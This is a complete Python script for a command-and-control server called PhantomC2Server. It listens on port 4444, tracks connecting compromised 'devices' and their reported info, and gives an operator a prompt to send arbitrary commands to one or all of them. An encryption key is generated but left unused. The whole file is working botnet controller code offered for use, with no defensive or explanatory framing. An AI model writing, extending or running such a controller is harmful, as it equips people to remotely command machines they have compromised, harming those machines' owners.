#!/usr/bin/env python3
import socket
import threading
import json
import datetime
import os
from cryptography.fernet import Fernet

class PhantomC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = True
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
        print(f"🔐 C2 Encryption Key: {self.key.decode()}")
        print(f"📡 Server starting on {host}:{port}")
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        print("✅ C2 Server listening...")
        
        # Accept thread
        def accept_loop():
            while self.running:
                try:
                    client, addr = server.accept()
                    thread = threading.Thread(target=self.handle_client, args=(client, addr))
                    thread.daemon = True
                    thread.start()
                except:
                    break
        
        threading.Thread(target=accept_loop, daemon=True).start()
        
        # Command input thread
        while self.running:
            cmd = input("\n💀 C2 > ").strip()
            if cmd == "exit":
                self.running = False
                break
            elif cmd == "list":
                self.list_clients()
            elif cmd.startswith("all:"):
                self.broadcast(cmd[4:])
            elif cmd.startswith("select:"):
                parts = cmd.split(' ', 1)
                if len(parts) == 2:
                    self.send_to_client(parts[0].split(':')[1], parts[1])
            else:
                print("Commands: list, all:<cmd>, select:<id> <cmd>, exit")
    
    def handle_client(self, client, addr):
        try:
            # Receive device info
            data = client.recv(4096).decode()
            device_id = data.split('\n')[0] if data else str(addr)
            self.clients[device_id] = {'socket': client, 'addr': addr, 'info': data}
            print(f"📱 New device connected: {device_id[:30]}...")
            
            while self.running:
                try:
                    response = client.recv(8192).decode()
                    if not response:
                        break
                    print(f"\n📨 Response from {device_id[:20]}:")
                    print(response)
                    print("\n💀 C2 > ", end='')
                except:
                    break
        except:
            pass
        finally:
            for k, v in list(self.clients.items()):
                if v['socket'] == client:
                    del self.clients[k]
            client.close()
    
    def list_clients(self):
        print(f"👥 Connected clients: {len(self.clients)}")
        for idx, (device_id, data) in enumerate(self.clients.items()):
            print(f"  [{idx}] {device_id[:30]}... from {data['addr']}")
    
    def broadcast(self, cmd):
        for device_id in self.clients:
            self.send_to_client(device_id, cmd)
    
    def send_to_client(self, device_id, cmd):
        if device_id not in self.clients:
            print(f"❌ Device {device_id} not found")
            return
        try:
            self.clients[device_id]['socket'].send(cmd.encode())
            print(f"📤 Sent to {device_id[:20]}: {cmd}")
        except:
            print(f"❌ Failed to send")
            del self.clients[device_id]
    
if __name__ == "__main__":
    server = PhantomC2Server()
    server.start()